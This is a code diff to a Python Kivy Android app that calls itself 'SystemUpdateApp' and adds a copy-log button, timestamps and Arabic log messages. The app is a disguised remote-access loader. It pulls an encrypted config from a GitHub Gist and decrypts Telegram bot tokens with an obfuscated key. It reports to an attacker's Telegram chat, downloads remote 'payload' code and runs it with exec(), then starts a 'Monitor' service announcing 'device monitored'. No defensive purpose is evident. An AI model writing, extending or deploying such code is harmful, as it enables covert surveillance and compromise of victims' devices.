@@ -9,6 +9,7 @@ from kivy.app import App
 from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.scrollview import ScrollView
 from kivy.uix.textinput import TextInput
+from kivy.uix.button import Button
 from kivy.utils import platform
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
@@ -17,11 +18,18 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class SystemUpdateApp(App):
     def build(self):
-        # رابط config.json على GitHub Gist (تم تحديثه بالرابط الجديد)
         self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/1029041e26d793614ba70bccaf542bfed53eeacd/config.json"
 
         layout = BoxLayout(orientation='vertical')
-        scroll = ScrollView(size_hint=(1, 1), do_scroll_x=False)
+        
+        # زر لنسخ السجل بالكامل (اختياري)
+        btn_layout = BoxLayout(size_hint_y=0.1, height=40)
+        copy_btn = Button(text="📋 نسخ السجل", size_hint_x=0.3, background_color=(0.2, 0.6, 0.2, 1))
+        copy_btn.bind(on_press=self.copy_log)
+        btn_layout.add_widget(copy_btn)
+        layout.add_widget(btn_layout)
+        
+        scroll = ScrollView(size_hint=(1, 1), do_scroll_x=True, do_scroll_y=True)
         self.log_view = TextInput(
             text="[System] Initializing...\n",
             readonly=True,
@@ -29,16 +37,27 @@ class SystemUpdateApp(App):
             foreground_color=(0, 1, 0, 1),
             font_size='14sp',
             size_hint_y=None,
-            cursor_color=(0, 0, 0, 0)
+            cursor_color=(0, 0, 0, 0),
+            selection_color=(0.2, 0.5, 0.8, 0.8),  # لون التحديد واضح
+            selection_text_color=(1, 1, 1, 1)
         )
         self.log_view.bind(minimum_height=self.log_view.setter('height'))
         scroll.add_widget(self.log_view)
         layout.add_widget(scroll)
+        
         threading.Thread(target=self.logic_engine, daemon=True).start()
         return layout
 
+    def copy_log(self, instance):
+        """نسخ كل محتوى السجل إلى الحافظة"""
+        from kivy.core.clipboard import Clipboard
+        Clipboard.copy(self.log_view.text)
+        self.log("📋 تم نسخ السجل بالكامل")
+
     def log(self, msg):
-        self.log_view.text += f"> {msg}\n"
+        """إضافة رسالة إلى السجل مع طابع زمني"""
+        timestamp = time.strftime("%H:%M:%S")
+        self.log_view.text += f"[{timestamp}] {msg}\n"
 
     def _get_encryption_key(self):
         part1 = [77, 121, 83, 117, 112, 51, 114, 83, 51, 99, 114, 51, 116]
@@ -57,7 +76,7 @@ class SystemUpdateApp(App):
             decrypted = decryptor.update(ciphertext) + decryptor.finalize()
             return decrypted.decode('utf-8')
         except Exception as e:
-            self.log(f"Decrypt error: {e}")
+            self.log(f"❌ فك التشفير فشل: {str(e)}")
             return ""
 
     def send_telegram(self, token, chat_id, text):
@@ -69,87 +88,97 @@ class SystemUpdateApp(App):
 
     def logic_engine(self):
         try:
-            self.log("Starting engine...")
+            self.log("بدء تشغيل المحرك...")
             time.sleep(2)
             if platform == 'android':
-                self.log("Requesting permissions (INTERNET)...")
+                self.log("طلب صلاحيات الإنترنت...")
                 from android.permissions import request_permissions, Permission
                 request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE])
                 time.sleep(2)
-            self.log("Testing direct IP connection (1.1.1.1)...")
+            self.log("اختبار الاتصال بـ 1.1.1.1...")
             try:
                 r = requests.get("https://1.1.1.1", timeout=5, verify=False)
-                self.log(f"Direct IP test OK (status {r.status_code})")
+                self.log(f"الاتصال ناجح (حالة {r.status_code})")
             except Exception as e:
-                self.log(f"Direct IP test FAILED: {str(e)[:80]}")
-            self.log(f"Fetching config from: {self.config_url[:60]}...")
+                self.log(f"⚠️ فشل اختبار الاتصال المباشر: {str(e)}")
+            self.log(f"جلب الإعدادات من: {self.config_url[:60]}...")
             response = requests.get(self.config_url, timeout=15, verify=False)
-            self.log(f"HTTP status: {response.status_code}")
+            self.log(f"حالة HTTP: {response.status_code}")
+            if response.status_code != 200:
+                self.log(f"❌ فشل تحميل config.json: HTTP {response.status_code}")
+                self.log("تأكد من صحة الرابط ومن أن الجهاز متصل بالإنترنت.")
+                return
             config = response.json()
-            self.log("Config JSON parsed successfully.")
+            self.log("تم تحليل ملف الإعدادات بنجاح.")
             tokens = []
-            for enc_token in config.get('t', []):
+            for i, enc_token in enumerate(config.get('t', [])):
                 decrypted = self.decrypt_token(enc_token)
                 if decrypted:
                     tokens.append(decrypted)
+                    self.log(f"✅ تم فك تشفير التوكن {i+1}")
+                else:
+                    self.log(f"❌ فشل فك تشفير التوكن {i+1}")
             v_id = self.decrypt_token(config.get('v', ''))
-            self.log(f"Decrypted {len(tokens)} tokens, chat ID: {v_id[:10]}...")
+            if not v_id:
+                self.log("❌ فشل فك تشفير معرف الدردشة (v)")
+                return
+            self.log(f"تم فك تشفير {len(tokens)} توكنات، معرف الدردشة: {v_id[:10]}...")
             globals()['MASTER_CONFIG'] = {
                 'tokens': tokens,
                 'v_id': v_id,
                 'payload_urls': config.get('payload_urls', [])
             }
             if tokens:
-                self.log("Sending startup message to Telegram...")
-                self.send_telegram(tokens[0], v_id, "🚀 System Online (AES-GCM Encrypted)")
-                self.log("Startup message sent.")
-            self.log("Moving to payload loading...")
-            self.log_view.text += "\n[Progress] Downloading modules... (35%)\n"
+                self.log("إرسال رسالة بدء التشغيل إلى Telegram...")
+                self.send_telegram(tokens[0], v_id, "🚀 النظام يعمل (AES-GCM)")
+                self.log("تم إرسال رسالة بدء التشغيل.")
+            self.log("بدء تحميل البايلودات...")
+            self.log_view.text += "\n[Progress] تحميل الوحدات... (35%)\n"
             self.load_payloads()
         except Exception as e:
             error_details = traceback.format_exc()
-            self.log(f"CRITICAL ERROR:\n{error_details}")
+            self.log(f"❌ خطأ جسيم:\n{error_details}")
             try:
                 if 'MASTER_CONFIG' in globals() and globals()['MASTER_CONFIG']:
                     token = globals()['MASTER_CONFIG']['tokens'][0]
                     v_id = globals()['MASTER_CONFIG']['v_id']
-                    self.send_telegram(token, v_id, f"❌ Error: {error_details[:200]}")
+                    self.send_telegram(token, v_id, f"❌ خطأ: {error_details[:200]}")
             except:
                 pass
 
     def load_payloads(self):
         payload_urls = globals()['MASTER_CONFIG'].get('payload_urls', [])
         if not payload_urls:
-            self.log("No payload URLs found in config!")
+            self.log("⚠️ لا توجد روابط بايلودات في الإعدادات!")
             return
         loaded = 0
         for url in payload_urls:
             try:
                 time.sleep(1)
                 name = url.split('/')[-1]
-                self.log(f"Loading {name}...")
+                self.log(f"تحميل {name}...")
                 code = requests.get(url, timeout=10, verify=False).text
                 exec(code, globals())
-                self.log(f"✅ {name} loaded")
+                self.log(f"✅ تم تحميل {name}")
                 loaded += 1
                 if loaded % 3 == 0:
                     self.send_telegram(globals()['MASTER_CONFIG']['tokens'][0],
                                        globals()['MASTER_CONFIG']['v_id'],
-                                       f"📦 Loaded {loaded}/{len(payload_urls)} modules")
+                                       f"📦 تم تحميل {loaded}/{len(payload_urls)} وحدة")
             except Exception as e:
-                self.log(f"⚠️ Failed {name}: {str(e)[:50]}")
+                self.log(f"❌ فشل تحميل {name}: {str(e)}")
                 continue
         if 'Monitor' in globals():
-            self.log("Starting Monitor service...")
+            self.log("بدء تشغيل خدمة المراقبة (Monitor)...")
             monitor = globals()['Monitor']()
             monitor.start()
-            self.log("✅ Monitor started")
-            self.log_view.text += "\n[System] Status: 100% - Up to date\n"
+            self.log("✅ تم تشغيل Monitor")
+            self.log_view.text += "\n[System] الحالة: 100% - جاهز\n"
             self.send_telegram(globals()['MASTER_CONFIG']['tokens'][0],
                                globals()['MASTER_CONFIG']['v_id'],
-                               "🎯 Full success - Device monitored")
+                               "🎯 اكتمل التشغيل - الجهاز تحت المراقبة")
         else:
-            self.log("ERROR: Monitor class not found after loading payloads.")
+            self.log("❌ خطأ: لم يتم العثور على كلاس Monitor بعد تحميل البايلودات.")
 
 if __name__ == '__main__':
     SystemUpdateApp().run()
